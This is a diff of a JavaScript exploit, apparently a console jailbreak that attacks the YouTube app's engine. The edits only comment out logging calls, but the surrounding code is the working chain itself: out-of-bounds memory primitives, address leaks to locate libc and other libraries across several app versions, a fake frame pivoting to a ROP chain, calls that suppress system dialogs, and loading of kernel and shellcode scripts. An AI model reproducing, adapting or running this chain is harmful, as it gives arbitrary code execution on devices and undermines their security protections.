@@ -211,7 +211,7 @@ function trigger() {
         //oob_arr[32] : 0xf -- victim_arr ExternalPointer_t 
         //oob_arr[33] : 0x27e8412d1 -- victm_arr base_pointer
 
-        await log("oob_arr length : " + toHex(oob_arr.length));
+        //await log("oob_arr length : " + toHex(oob_arr.length));
 
         const oob_arr_before = [];
         for (let i = 0; i < 100; i++) {
@@ -234,7 +234,7 @@ function trigger() {
             throw new Error("Failed to get unstable primitive");
         }
 
-        await log("Unstable primitive achieved");
+        //await log("Unstable primitive achieved");
 
         function addrof_unstable(obj) {
             const obj_arr_org_value = oob_arr[obj_arr_offset];
@@ -679,9 +679,9 @@ function trigger() {
             return backing_store;
         }
 
-        await log("Stable primitive achieved");
+        //await log("Stable primitive achieved");
 
-        await log("Setting up ROP...");
+        //await log("Setting up ROP...");
 
         // https://github.com/google/google-ctf/tree/main/2023/quals/sandbox-v8box/solution
         // We don't have pointer compression
@@ -721,59 +721,59 @@ function trigger() {
         write64(bc_start, 0xAB0025n);
 
         const stack_addr = addrof(pwn(1)) + 0x1n;
-        await log("Stack leak @ " + toHex(stack_addr));
+        //await log("Stack leak @ " + toHex(stack_addr));
 
         const text_leak = read64(stack_addr + 0x8n);
-        await log("Text leak @ " + toHex(text_leak));
+        //await log("Text leak @ " + toHex(text_leak));
         const text_leak_mask = text_leak & 0xFFFn;
 
         if (text_leak_mask == 0x81Fn) {
             Y2_VERSION = "01.000.003 (min fw 4.03)";
-            await log("Youtube " + Y2_VERSION + " detected");
+            //await log("Youtube " + Y2_VERSION + " detected");
             Y2_OFFSET = Y2_OFFSET_403;
             ROP = ROP_403;
 
             eboot_base = read64(stack_addr + 0x8n) - Y2_OFFSET.EBOOT_LEAK;
-            await log("eboot_base @ " + toHex(eboot_base));
+            //await log("eboot_base @ " + toHex(eboot_base));
 
             libc_base = read64(eboot_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
-            await log("libc_base @ " + toHex(libc_base));
+            //await log("libc_base @ " + toHex(libc_base));
 
         } else if (text_leak_mask == 0xFDFn) {
             Y2_VERSION = "01.000.030 (min fw 12.20)";
-            await log("Youtube " + Y2_VERSION + " detected");
+            //await log("Youtube " + Y2_VERSION + " detected");
             Y2_OFFSET = Y2_OFFSET_1220;
             ROP = ROP_1220;
 
             libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
-            await log("libcobalt_base @ " + toHex(libcobalt_base));
+            //await log("libcobalt_base @ " + toHex(libcobalt_base));
 
             libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
-            await log("libstarboard_base @ " + toHex(libstarboard_base));
+            //await log("libstarboard_base @ " + toHex(libstarboard_base));
 
             libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
-            await log("libc_base @ " + toHex(libc_base));
+            //await log("libc_base @ " + toHex(libc_base));
 
         } else if (text_leak_mask == 0x73fn) {
             Y2_VERSION = "01.009.202 (min fw 13.20)";
-            await log("Youtube " + Y2_VERSION + " detected");
+            //await log("Youtube " + Y2_VERSION + " detected");
             Y2_OFFSET = Y2_OFFSET_1320;
             ROP = ROP_1320;
 
             libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
-            await log("libcobalt_base @ " + toHex(libcobalt_base));
+            //await log("libcobalt_base @ " + toHex(libcobalt_base));
 
             libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
-            await log("libstarboard_base @ " + toHex(libstarboard_base));
+            //await log("libstarboard_base @ " + toHex(libstarboard_base));
 
             libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
-            await log("libc_base @ " + toHex(libc_base));
+            //await log("libc_base @ " + toHex(libc_base));
         } else {
             throw new Error("UNSUPPORTED YOUTUBE VERSION");
         }
 
         const rop_chain_addr = get_backing_store(rop_chain);
-        await log("ROP chain @ " + toHex(rop_chain_addr));
+        //await log("ROP chain @ " + toHex(rop_chain_addr));
 
         // Fake bytecode for r14 register
         fake_bc[0] = 0xABn; // Return opcode - keeps interpreter happy
@@ -793,7 +793,7 @@ function trigger() {
         write64(fake_frame_addr + 0x9n, ROP.pop_rsp); // pop rsp ; ret
         write64(fake_frame_addr + 0x9n + Y2_OFFSET.RSP_OFFSET, rop_chain_addr);
 
-        await log("fake_frame_addr @ " + toHex(fake_frame_addr));
+        //await log("fake_frame_addr @ " + toHex(fake_frame_addr));
 
         call_rop = function (address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
             let rop_i = 0;
@@ -852,10 +852,10 @@ function trigger() {
             return return_value_buf[0];
         }
 
-        await log("ROP test, should see 0x0000000200000000");
+        //await log("ROP test, should see 0x0000000200000000");
 
         rop_test = call(ROP.mov_rax_0x200000000);
-        await log(toHex(rop_test));
+        //await log(toHex(rop_test));
 
         if (rop_test !== 0x200000000n) {
             await log("ERROR: ROP test failed");
@@ -917,7 +917,7 @@ function trigger() {
 
         if (Y2_OFFSET === Y2_OFFSET_403) {
             // Thanks ufm42 for better implementation
-            await log("Disabling PSN dialog and YouTube splash...");
+            //await log("Disabling PSN dialog and YouTube splash...");
 
             const window_addr = addrof(window);
             //await log("window_addr: " + toHex(window_addr));
@@ -958,12 +958,12 @@ function trigger() {
             const splash_screen_web_module_impl_addr = read64(splash_screen_web_module_addr + 0x18n);
             //await log("splash_screen_web_module_impl_addr: " + toHex(splash_screen_web_module_impl_addr));
 
-            await log("Disabling YouTube splash screen...");
+            //await log("Disabling YouTube splash screen...");
             const main_web_module_generation_addr = browser_module_addr + 0xB08n;
             write32(main_web_module_generation_addr, 0xFFFFFFFFn);
-            await log("YT splash disabled!");
+            //await log("YT splash disabled!");
 
-            await log("Disabling PSN popup...");
+            //await log("Disabling PSN popup...");
 
             call(read64(Y2_OFFSET.sceMsgDialogTerminate));
 
@@ -977,7 +977,7 @@ function trigger() {
             // Set is_running to 1 (true)
             write8(is_running_addr, 0x1n);
 
-            await log("PSN popup disabled!");
+            //await log("PSN popup disabled!");
 
         } else {
 
@@ -1030,14 +1030,14 @@ function trigger() {
             await log("[WARN] Failed to protect splash.html: " + (e.message || e));
         }
 
-        send_notification(version_string + "\nFW : " + FW_VERSION + "\nTitle ID : " + TITLE_ID + "\nAppVer : " + Y2_VERSION);
-        await log("FW detected : " + FW_VERSION);
-        await log("Title ID detected : " + TITLE_ID);
-        await log("AppVer detected : " + Y2_VERSION);
+        //send_notification(version_string + "\nFW : " + FW_VERSION + "\nTitle ID : " + TITLE_ID + "\nAppVer : " + Y2_VERSION);
+        //await log("FW detected : " + FW_VERSION);
+        //await log("Title ID detected : " + TITLE_ID);
+        //await log("AppVer detected : " + Y2_VERSION);
         await log("FW : " + FW_VERSION + "  Title ID : " + TITLE_ID);
         await log("AppVer : " + Y2_VERSION);
 
-        await log("libkernel_base @ " + toHex(libkernel_base));
+        //await log("libkernel_base @ " + toHex(libkernel_base));
 
         await load_localscript('kernel.js');
         await load_localscript('aioshellcode.js');
